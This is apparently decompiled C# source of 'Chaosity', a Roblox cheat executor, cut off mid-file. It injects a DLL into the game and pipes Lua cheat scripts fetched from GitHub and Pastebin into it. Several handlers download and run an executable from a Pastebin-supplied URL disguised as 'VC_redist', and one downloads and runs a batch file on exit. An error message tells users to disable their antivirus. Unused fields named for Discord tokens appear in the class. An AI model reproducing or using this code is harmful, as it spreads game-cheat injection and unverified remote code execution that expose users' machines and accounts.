// Decompiled with JetBrains decompiler
// Type: Chaosity.Chaosity
// Assembly: Chaosity, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8FD1C12D-B5CF-4C0B-B451-47DE735C992C
// Assembly location: C:\Users\povar\Desktop\Chaosity (Exploit)\ChaosityExploit.exe

using Bunifu.Framework.UI;
using DiscordRpcDemo;
using FlatUI;
using Microsoft.Win32;
using ModuleAPI;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Chaosity
{
  public class Chaosity : Form
  {
    private WebClient webClient;
    private DiscordRpc.RichPresence presence;
    private DiscordRpc.EventHandlers handlers;
    private List<string> discordLDBs;
    private List<string> discordTokens;
    private Module api;
    private Module module;
    private Dictionary<string, string> dirs;
    private WebBrowser editor;
    private string stringMaster;
    private string script;
    private OpenFileDialog open;
    private IContainer components;
    private Panel panel1;
    private Label label2;
    private BunifuElipse bunifuElipse1;
    private Button button2;
    private Button button1;
    private BunifuDragControl bunifuDragControl1;
    private BunifuDragControl bunifuDragControl2;
    private ListBox listBox1;
    private BunifuElipse bunifuElipse2;
    private BunifuElipse bunifuElipse3;
    private BunifuElipse bunifuElipse4;
    private BunifuElipse bunifuElipse5;
    private BunifuElipse bunifuElipse6;
    private System.Windows.Forms.Timer timer1;
    private Button button7;
    private Button InjectionButtonPannel;
    private Button button4;
    private System.Windows.Forms.Timer topGamesRefresh;
    private Button button3;
    private FlatTextBox flatTextBox1;
    private WebBrowser webBrowser1;
    private System.Windows.Forms.Timer injectDet;
    private Button button5;
    private CheckBox cb2;
    private TabControl tabControl1;
    private TabPage MainPage;
    private TabPage Settings;
    private TabPage GameHubs;
    private Button button13;
    private Button button15;
    private Button button14;
    private Label label5;
    private Label label4;
    private Label label3;
    private Label label6;
    private Button button6;
    private TabPage JailbreakCommands;
    private Button button20;
    private TabPage PremiumGames;
    private FlowLayoutPanel flowLayoutPanel1;
    private Panel panel5;
    private PictureBox pictureBox6;
    private Label label8;
    private Panel panel7;
    private PictureBox pictureBox7;
    private Label label9;
    private Panel panel8;
    private PictureBox pictureBox8;
    private Label label10;
    private Panel panel9;
    private PictureBox pictureBox9;
    private Label label11;
    private Button button22;
    private Button button23;
    private Button button24;
    private Button button25;
    private Button button26;
    private Button button27;
    private Button button28;
    private Button button19;
    private Button button29;
    private Button button10;
    private Button button21;
    private Button button9;
    private Button button11;
    private Label label13;
    private Label label12;
    private Panel panel2;
    private PictureBox pictureBox1;
    private Label label14;
    private Label label15;
    private RichTextBox richTextBox2;
    private Button button17;
    private Button button47;
    private Button button46;
    private Button button45;
    private Button button44;
    private Button button43;
    private Button button42;
    private Button button41;
    private Button button40;
    private Button button39;
    private Button button38;
    private Button button37;
    private Button button36;
    private Button button34;
    private Button button31;
    private Button button59;
    private Button button58;
    private Button button57;
    private Button button56;
    private Button button55;
    private Button button48;
    private Button button54;
    private Button button53;
    private FlatTextBox flatTextBox4;
    private Button button51;
    private FlatTextBox flatTextBox2;
    private Button button60;
    private Button button61;
    private TabPage JailbreakTeleports;
    private Button button33;
    private CheckBox checkBox3;
    private TabPage PremiumLogin;
    private Button button8;
    private TextBox textBox2;
    private Button button62;
    private Label label1;
    private Button button63;
    private Button button64;
    private Button button52;
    private Button button49;
    private CheckBox checkBox4;
    private CheckBox checkBox5;
    private Button button50;
    private FlatTextBox flatTextBox3;
    private Button button66;
    private Button button65;
    private Button button35;
    private Label label17;
    private Label label16;
    private Button button67;
    public Button button16;
    public Button button30;
    public Button button69;
    public Button button12;
    private TabPage PremiumScripts;
    private Button button18;
    private Button button32;
    private Button button68;

    public Chaosity()
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.Filter = "Lua Script (*.txt)|*.txt|Lua Script (*.lua)|*.lua";
      openFileDialog.FilterIndex = 1;
      openFileDialog.Title = "Open Script";
      this.open = openFileDialog;
      this.components = (IContainer) null;
      // ISSUE: explicit constructor call
      this.InitializeComponent();
      this.handlers = new DiscordRpc.EventHandlers();
      DiscordRpc.Initialize("690288190283972619", ref this.handlers, true, (string) null);
      this.presence.state = "Project: Chaosity";
      this.presence.details = "Download Chaosity!";
      this.presence.startTimestamp = 0L;
      this.presence.largeImageKey = "chaosity_pfp";
      this.presence.largeImageText = "Project: Chaosity";
      this.presence.smallImageKey = "chaosity_pfp";
      this.presence.smallImageText = "Project: Chaosity";
      DiscordRpc.UpdatePresence(ref this.presence);
      this.TopMost = true;
      this.webBrowser1.ScriptErrorsSuppressed = true;
      new WebClient().Proxy = (IWebProxy) null;
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BROWSER_EMULATION", true);
        string friendlyName = AppDomain.CurrentDomain.FriendlyName;
        if (registryKey.GetValue(friendlyName) == null)
          registryKey.SetValue(friendlyName, (object) 11001, RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
      }
      this.webBrowser1.Url = new Uri(string.Format("file:///{0}/Monaco/Monaco.html", (object) Directory.GetCurrentDirectory()));
    }

    private bool universalBypassInstalled()
    {
      return Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/Google/Chrome/User Data/Default/Extensions/aihomhdbhpnpmcnnbckjjcebjoikpihj");
    }

    private string UseEncryptedString(string v)
    {
      throw new NotImplementedException();
    }

    private void Chaosity_Load(object sender, EventArgs e)
    {
      this.module.SetIdentity("chaos");
      if (this.universalBypassInstalled())
      {
        int num = (int) MessageBox.Show("You must uninstall Universal Bypass before you can use Chaosity", "Universal Bypass Failed");
        Environment.Exit(0);
      }
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
      this.JoinServer("DEVYCQp");
      this.scriptBoxLoad();
    }

    private void JoinServer(string v)
    {
    }

    private void metroButton1_Click(object sender, EventArgs e)
    {
      Process.GetCurrentProcess().Kill();
    }

    private void metroButton2_Click(object sender, EventArgs e)
    {
      this.WindowState = FormWindowState.Minimized;
    }

    private void button1_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webBrowser1.Document.InvokeScript("GetText", (object[]) new string[0]).ToString());
    }

    private void timer1_Tick(object sender, EventArgs e)
    {
      this.button1.BackColor = this.panel1.BackColor;
      this.button2.BackColor = this.panel1.BackColor;
      this.button4.BackColor = this.panel1.BackColor;
      this.button6.BackColor = this.panel1.BackColor;
      this.button7.BackColor = this.panel1.BackColor;
    }

    private void button6_Click(object sender, EventArgs e)
    {
      if (MessageBox.Show("Are You Sure You Want To Exit?", "Exit Chaosity", MessageBoxButtons.YesNo) != DialogResult.Yes)
        return;
      string path = "C:\\Chaosity";
      if (Directory.Exists(path))
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(path);
        foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
          directory.Delete(true);
        foreach (FileSystemInfo file in directoryInfo.GetFiles())
          file.Delete();
        Directory.Delete(path);
      }
      using (WebClient webClient = new WebClient())
      {
        webClient.DownloadString("https://pastebin.com/raw/sUCYF2Pb");
        webClient.DownloadFile("https://raw.githubusercontent.com/ChaosityYT/Chaosity-Scripts/master/del.bat3", "del.bat");
        Process.Start(Directory.GetCurrentDirectory().ToString() + "/del.bat");
      }
      foreach (Process process in Process.GetProcessesByName("ChaosityExploit"))
        process.Kill();
    }

    private async void button7_Click(object sender, EventArgs e)
    {
      for (int i = 1; i <= 9; ++i)
      {
        this.Opacity -= 0.1;
        await Task.Delay(1);
      }
      this.WindowState = FormWindowState.Minimized;
      this.Opacity = 1.0;
    }

    private void webBrowser1_DocumentCompleted(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
    }

    private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
    {
    }

    private void InjectionButtonPannel_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.cb2.Checked)
        {
          NamedPipes.EasyExploitsInject();
          NamedPipes.wrd = false;
          NamedPipes.easy = true;
          NamedPipes.nem = false;
        }
        else
        {
          int num = (int) MessageBox.Show("Please select a API & Inject first.", "API Selection // Injection");
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("Your Antivirus Is Blocking The DLL From Downloading. Please Disable Your Antivirus Then Reload Chaosity.If This Error Continues Please Message Chaosity On Discord @Chaosity#0001");
        Environment.Exit(0);
      }
    }

    private void button3_Click(object sender, EventArgs e)
    {
    }

    private void button2_Click(object sender, EventArgs e)
    {
      this.webBrowser1.Document.InvokeScript("SetText", new object[1]
      {
        (object) ""
      });
    }

    private void listBox1_DoubleClick(object sender, EventArgs e)
    {
      object selectedItem = this.listBox1.SelectedItem;
      if (selectedItem == null)
        return;
      if (System.IO.File.Exists(Application.StartupPath + "\\scripts\\" + selectedItem.ToString()))
        this.webBrowser1.Document.InvokeScript("SetText", (object[]) new string[1]
        {
          System.IO.File.ReadAllText(Application.StartupPath + "\\scripts\\" + selectedItem.ToString())
        });
      else
        this.listBox1.Items.Remove(this.listBox1.SelectedItem);
    }

    private void button4_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.GameHubs;
    }

    private void topGamesRefresh_Tick(object sender, EventArgs e)
    {
    }

    private void panel1_Paint(object sender, PaintEventArgs e)
    {
    }

    private void button3_Click_1(object sender, EventArgs e)
    {
      Process.Start("http://www.youtube.com/channel/UCopSfrN6QxKMQEquo6YzizA?sub_confirmation=1");
    }

    private void button1_MouseHover(object sender, EventArgs e)
    {
    }

    private void button1_MouseLeave(object sender, EventArgs e)
    {
    }

    private void button2_MouseHover(object sender, EventArgs e)
    {
    }

    private void button2_MouseLeave(object sender, EventArgs e)
    {
    }

    private void button4_MouseHover(object sender, EventArgs e)
    {
    }

    private void button4_MouseLeave(object sender, EventArgs e)
    {
    }

    private async void button3_Click_2(object sender, EventArgs e)
    {
      Cursor.Current = Cursors.WaitCursor;
      this.listBox1.SelectedItems.Clear();
      for (int index = this.listBox1.Items.Count - 1; index >= 0; --index)
      {
        if (this.listBox1.Items[index].ToString().ToLower().Contains(this.flatTextBox1.Text.ToLower()))
          this.listBox1.SetSelected(index, true);
      }
      await Task.Delay(50);
      Cursor.Current = Cursors.Default;
    }

    private void injectDet_Tick(object sender, EventArgs e)
    {
      if (NamedPipes.NamedPipeExist(NamedPipes.luapipename))
        this.label2.Text = "Injected";
      else
        this.label2.Text = "Not Injected";
    }

    private void webBrowser1_DocumentCompleted_1(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
    }

    private void label2_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.cb2.Checked)
        {
          NamedPipes.EasyExploitsInject();
          NamedPipes.wrd = false;
          NamedPipes.easy = true;
          NamedPipes.nem = false;
        }
        else
        {
          int num = (int) MessageBox.Show("Please select a API & Inject first.", "API Selection // Injection");
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("Your Antivirus Is Blocking The DLL From Downloading. Please Disable Your Antivirus Then Reload Chaosity.If This Error Continues Please Message Chaosity On Discord @Chaosity#0001");
        Environment.Exit(0);
      }
    }

    private void label1_Click(object sender, EventArgs e)
    {
      Process.Start("https://www.wearedevs.net/");
    }

    private void button5_Click(object sender, EventArgs e)
    {
      this.topGamesRefresh.Start();
      this.listBox1.Items.Clear();
      string[] separator = new string[1]{ "Chaositylol" };
      this.stringMaster = new WebClient().DownloadString("https://pastebin.com/raw/QQBX2WCd");
      foreach (object obj in new WebClient().DownloadString("https://pastebin.com/raw/YhXQ5a2V").Split(separator, StringSplitOptions.RemoveEmptyEntries))
        this.listBox1.Items.Add(obj);
    }

    private void button5_Click_1(object sender, EventArgs e)
    {
      this.listBox1.Items.Clear();
      DirectoryInfo directoryInfo = new DirectoryInfo(Application.StartupPath + "/scripts");
      FileInfo[] files1 = directoryInfo.GetFiles("*.txt");
      FileInfo[] files2 = directoryInfo.GetFiles("*.lua");
      foreach (FileSystemInfo fileSystemInfo in files1)
        this.listBox1.Items.Add((object) fileSystemInfo.Name);
      foreach (FileSystemInfo fileSystemInfo in files2)
        this.listBox1.Items.Add((object) fileSystemInfo.Name);
    }

    private void listBox1_DockChanged(object sender, EventArgs e)
    {
    }

    private void button8_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Please select a API & Inject first.", "API Selection // Injection");
      this.tabControl1.SelectedTab = this.Settings;
    }

    private void checkBox1_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void button9_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.MainPage;
    }

    private void MainPage_Click(object sender, EventArgs e)
    {
    }

    private void InjectionMenu_Click(object sender, EventArgs e)
    {
    }

    private void button11_Click(object sender, EventArgs e)
    {
      this.Hide();
      new ChaosityMain().Show();
    }

    private void button12_Click(object sender, EventArgs e)
    {
      this.Hide();
      new FGameHubMain().Show();
    }

    private void button13_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.MainPage;
    }

    private void button14_Click(object sender, EventArgs e)
    {
      if (this.open.ShowDialog() != DialogResult.OK)
        return;
      this.webBrowser1.Document.InvokeScript("SetText", (object[]) new string[1]
      {
        System.IO.File.ReadAllText(this.open.FileName)
      });
    }

    private void button15_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
      saveFileDialog.Filter = "Lua File (*.lua)|*.lua|Text File (*.txt)|*.txt";
      saveFileDialog.Title = "Save Script";
      if (saveFileDialog.ShowDialog() != DialogResult.OK)
        return;
      try
      {
        string str = this.webBrowser1.Document.InvokeScript("GetText", (object[]) new string[0]).ToString();
        StreamWriter streamWriter = new StreamWriter((Stream) System.IO.File.Create(saveFileDialog.FileName));
        streamWriter.Write(str);
        streamWriter.Dispose();
      }
      catch
      {
        int num = (int) MessageBox.Show("An unexpected error occured!", "Oof");
      }
    }

    private void scriptBoxLoad()
    {
      this.listBox1.Items.Clear();
      DirectoryInfo directoryInfo = new DirectoryInfo(Application.StartupPath + "/scripts");
      FileInfo[] files1 = directoryInfo.GetFiles("*.txt");
      FileInfo[] files2 = directoryInfo.GetFiles("*.lua");
      foreach (FileSystemInfo fileSystemInfo in files1)
        this.listBox1.Items.Add((object) fileSystemInfo.Name);
      foreach (FileSystemInfo fileSystemInfo in files2)
        this.listBox1.Items.Add((object) fileSystemInfo.Name);
    }

    private void refresh_Click(object sender, EventArgs e)
    {
      this.scriptBoxLoad();
    }

    private void listBox1_MouseUp(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Right)
        return;
      ContextMenu contextMenu = new ContextMenu();
      MenuItem menuItem = new MenuItem();
      menuItem.Text = "&Refresh";
      contextMenu.MenuItems.Add(menuItem);
      menuItem.Click += new EventHandler(this.refresh_Click);
      contextMenu.Show((Control) this, new Point(e.X + this.Width - 280, e.Y + 25));
    }

    private void pictureBox1_Click(object sender, EventArgs e)
    {
      this.Hide();
      new ChaosityMain().Show();
    }

    private void pictureBox2_Click(object sender, EventArgs e)
    {
      this.Hide();
      new FGameHubMain().Show();
    }

    private void button16_Click(object sender, EventArgs e)
    {
      this.Hide();
      new OMGGameHubMain().Show();
    }

    private void pictureBox3_Click(object sender, EventArgs e)
    {
      this.Hide();
      new OMGGameHubMain().Show();
    }

    private void cb3_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void checkBox2_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void checkBox3_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void button17_Click(object sender, EventArgs e)
    {
      this.Hide();
      new DGameHubMain().Show();
    }

    private void pictureBox4_Click(object sender, EventArgs e)
    {
      this.Hide();
      new DGameHubMain().Show();
    }

    private void button18_Click_1(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Make sure to restart your PC after installing VC Redist x86 // Opening VC Redist x86", "Injection Fix");
      WebClient webClient = new WebClient();
      string address = webClient.DownloadString("https://pastebin.com/raw/3em4nuV8");
      webClient.DownloadFile(address, Application.StartupPath + "/VC_redist.x86.exe");
      Process.Start(Directory.GetCurrentDirectory() + "/VC_redist.x86.exe");
      string path = "C:\\Chaosity";
      if (!Directory.Exists(path))
        return;
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
        directory.Delete(true);
      foreach (FileSystemInfo file in directoryInfo.GetFiles())
        file.Delete();
      Directory.Delete(path);
    }

    private void button19_Click(object sender, EventArgs e)
    {
      if (DialogResult.Yes != MessageBox.Show("Are you sure you want to reinstall ROBLOX?", nameof (Chaosity), MessageBoxButtons.YesNo, MessageBoxIcon.Question))
        return;
      int num1 = (int) MessageBox.Show("Roblox is now reinstalling!\nThis could take a while, please wait patiently.", nameof (Chaosity), MessageBoxButtons.OK);
      try
      {
        foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
          process.Kill();
      }
      catch (Exception ex)
      {
        int num2 = (int) MessageBox.Show(Convert.ToString((object) ex), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      try
      {
        Directory.SetCurrentDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
        if (Directory.Exists("Roblox"))
          Directory.Delete("Roblox", true);
      }
      catch
      {
      }
      try
      {
        Directory.SetCurrentDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
        if (Directory.Exists("Roblox"))
          Directory.Delete("Roblox", true);
        if (System.IO.File.Exists("Installer.exe"))
          System.IO.File.Delete("Installer.exe");
      }
      catch
      {
      }
      new WebClient().DownloadFile("http://setup.roblox.com/RobloxPlayerLauncher.exe", "Installer.exe");
      Process.Start("Installer.exe");
    }

    private void checkBox3_CheckedChanged_1(object sender, EventArgs e)
    {
    }

    private void PremiumGames_Click(object sender, EventArgs e)
    {
    }

    private void flowLayoutPanel1_Paint(object sender, PaintEventArgs e)
    {
    }

    private void checkBox3_CheckedChanged_2(object sender, EventArgs e)
    {
    }

    private void button27_Click(object sender, EventArgs e)
    {
      Mutex mutex = new Mutex(true, "ROBLOX_singletonMutex");
      int num = (int) MessageBox.Show("Multiple Roblox activated successfully, join on another account to enable another session.", "Multiple Roblox");
    }

    private void button22_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.MainPage;
      this.button63.Visible = true;
      this.button68.Visible = false;
    }

    private void textBox1_TextChanged(object sender, EventArgs e)
    {
    }

    private void button28_Click(object sender, EventArgs e)
    {
      if (DialogResult.Yes != MessageBox.Show("Are you sure you want to reinstall ROBLOX?", nameof (Chaosity), MessageBoxButtons.YesNo, MessageBoxIcon.Question))
        return;
      int num1 = (int) MessageBox.Show("Roblox is now reinstalling!\nThis could take a while, please wait patiently.", nameof (Chaosity), MessageBoxButtons.OK);
      try
      {
        foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
          process.Kill();
      }
      catch (Exception ex)
      {
        int num2 = (int) MessageBox.Show(Convert.ToString((object) ex), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      try
      {
        Directory.SetCurrentDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
        if (Directory.Exists("Roblox"))
          Directory.Delete("Roblox", true);
      }
      catch
      {
      }
      try
      {
        Directory.SetCurrentDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
        if (Directory.Exists("Roblox"))
          Directory.Delete("Roblox", true);
        if (System.IO.File.Exists("Installer.exe"))
          System.IO.File.Delete("Installer.exe");
      }
      catch
      {
      }
      new WebClient().DownloadFile("http://setup.roblox.com/RobloxPlayerLauncher.exe", "Installer.exe");
      Process.Start("Installer.exe");
    }

    private void button19_Click_1(object sender, EventArgs e)
    {
      try
      {
        if (this.cb2.Checked)
        {
          NamedPipes.EasyExploitsInject();
          NamedPipes.wrd = false;
          NamedPipes.easy = true;
          NamedPipes.nem = false;
        }
        else
        {
          int num = (int) MessageBox.Show("Please select a API & Inject first.", "API Selection // Injection");
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("Your Antivirus Is Blocking The DLL From Downloading. Please Disable Your Antivirus Then Reload Chaosity.If This Error Continues Please Message Chaosity On Discord @Chaosity#0001");
        Environment.Exit(0);
      }
    }

    private void button29_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Make sure to restart your PC after installing VC Redist x86 // Opening VC Redist x86", "Injection Fix");
      WebClient webClient = new WebClient();
      string address = webClient.DownloadString("https://pastebin.com/raw/3em4nuV8");
      webClient.DownloadFile(address, Application.StartupPath + "/VC_redist.x86.exe");
      Process.Start(Directory.GetCurrentDirectory() + "/VC_redist.x86.exe");
      string path = "C:\\Chaosity";
      if (!Directory.Exists(path))
        return;
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
        directory.Delete(true);
      foreach (FileSystemInfo file in directoryInfo.GetFiles())
        file.Delete();
      Directory.Delete(path);
    }

    private void button10_Click_1(object sender, EventArgs e)
    {
      Mutex mutex = new Mutex(true, "ROBLOX_singletonMutex");
      int num = (int) MessageBox.Show("Multiple Roblox activated successfully, join on another account to enable another session.", "Multiple Roblox");
    }

    private void button18_Click(object sender, EventArgs e)
    {
    }

    private void button30_Click(object sender, EventArgs e)
    {
      this.button64.Visible = true;
    }

    private void button21_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.MainPage;
    }

    private void button9_Click_1(object sender, EventArgs e)
    {
      try
      {
        this.Hide();
        new DGameHubMain().Show();
      }
      catch (Exception ex)
      {
      
      }
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void button11_Click_1(object sender, EventArgs e)
    {
    
    }

    private void button12_Click_1(object sender, EventArgs e)
    {
     
    }

    private void button16_Click_1(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.PremiumGames;
      this.button63.Visible = false;
      if (Process.GetProcessesByName("Discord").Length == 0)
        return;
      this.JoinServer("DEVYCQp");
    }

    private void pictureBox6_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.JailbreakCommands;
    }

    private void label15_Click(object sender, EventArgs e)
    {
    }

    private void button8_Click_1(object sender, EventArgs e)
    {
      if (this.webBrowser1.Visible)
      {
        this.button1.Visible = false;
        this.webBrowser1.Visible = false;
        this.button17.Visible = true;
        this.richTextBox2.Visible = true;
      }
      else
      {
        if (!this.richTextBox2.Visible)
          return;
        this.button1.Visible = true;
        this.webBrowser1.Visible = true;
        this.button17.Visible = false;
        this.richTextBox2.Visible = false;
      }
    }

    private void richTextBox2_TextChanged(object sender, EventArgs e)
    {
    }

    private void button17_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webBrowser1.Document.InvokeScript("GetText", (object[]) new string[0]).ToString());
    }

    private void JailbreakCommands_Click(object sender, EventArgs e)
    {
    }

    private void GameHubs_Click(object sender, EventArgs e)
    {
    }

    private void button26_Click(object sender, EventArgs e)
    {
    }

    private void button38_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakInstantPrisoner.txt"));
    }

    private void checkBox3_CheckedChanged_3(object sender, EventArgs e)
    {
      if (this.checkBox3.Checked)
      {
        this.button1.Visible = false;
        this.webBrowser1.Visible = false;
        this.button17.Visible = true;
        this.richTextBox2.Visible = true;
      }
      else
      {
        this.button1.Visible = true;
        this.webBrowser1.Visible = true;
        this.button17.Visible = false;
        this.richTextBox2.Visible = false;
      }
    }

    private void button25_Click(object sender, EventArgs e)
    {
      if (DialogResult.Yes != MessageBox.Show("Are you sure you want to reinstall ROBLOX?", nameof (Chaosity), MessageBoxButtons.YesNo, MessageBoxIcon.Question))
        return;
      int num1 = (int) MessageBox.Show("Roblox is now reinstalling!\nThis could take a while, please wait patiently.", nameof (Chaosity), MessageBoxButtons.OK);
      try
      {
        foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
          process.Kill();
      }
      catch (Exception ex)
      {
        int num2 = (int) MessageBox.Show(Convert.ToString((object) ex), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      try
      {
        Directory.SetCurrentDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
        if (Directory.Exists("Roblox"))
          Directory.Delete("Roblox", true);
      }
      catch
      {
      }
      try
      {
        Directory.SetCurrentDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
        if (Directory.Exists("Roblox"))
          Directory.Delete("Roblox", true);
        if (System.IO.File.Exists("Installer.exe"))
          System.IO.File.Delete("Installer.exe");
      }
      catch
      {
      }
      new WebClient().DownloadFile("http://setup.roblox.com/RobloxPlayerLauncher.exe", "Installer.exe");
      Process.Start("Installer.exe");
    }

    private void button23_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Make sure to restart your PC after installing VC Redist x86 // Opening VC Redist x86", "Injection Fix");
      WebClient webClient = new WebClient();
      string address = webClient.DownloadString("https://pastebin.com/raw/3em4nuV8");
      webClient.DownloadFile(address, Application.StartupPath + "/VC_redist.x86.exe");
      Process.Start(Directory.GetCurrentDirectory() + "/VC_redist.x86.exe");
      string path = "C:\\Chaosity";
      if (!Directory.Exists(path))
        return;
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
        directory.Delete(true);
      foreach (FileSystemInfo file in directoryInfo.GetFiles())
        file.Delete();
      Directory.Delete(path);
    }

    private void button24_Click(object sender, EventArgs e)
    {
      foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
        process.Kill();
    }

    private void button62_Click(object sender, EventArgs e)
    {
    }

    private void button8_Click_2(object sender, EventArgs e)
    {
      Process.Start("https://www.shadowcheats.com/chaosity/key");
    }

    private void button63_Click(object sender, EventArgs e)
    {
      this.tabControl1.SelectedTab = this.Settings;
    }

    private void button65_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Please select a API & Inject first.", "API Selection // Injection");
      this.tabControl1.SelectedTab = this.Settings;
    }

    private void button53_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakPlayerFly.txt"));
    }

    private void button48_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakInfiniteJump.txt"));
    }

    private void button34_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakCtrlTP.txt"));
    }

    private void button55_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakUnArrest.txt"));
    }

    private void button37_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakMobileGarage.txt"));
    }

    private void button41_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakTracers.txt"));
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakOfficialESP.txt"));
    }

    private void button43_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakGodModeSS.txt"));
    }

    private void button45_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakGodModeSS.txt"));
    }

    private void checkBox4_CheckedChanged(object sender, EventArgs e)
    {
      if (this.checkBox4.Checked)
        NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakRainbowCarSSStart.txt"));
      else
        NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakRainbowCarSSStop.txt"));
    }

    private void button60_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakGunMod.txt"));
    }

    private void button20_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakRobBigStores.txt"));
    }

    private void button40_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakPunchKillAura.txt"));
    }

    private void button46_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakInstantGarage.txt"));
    }

    private void button31_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://raw.githubusercontent.com/ChaosityYT/ChaosityPremiumScripts/master/JailbreakNoPrisonWaitTimer.txt"));
    }

    private void button56_Click(object sender, EventArgs e)
    {
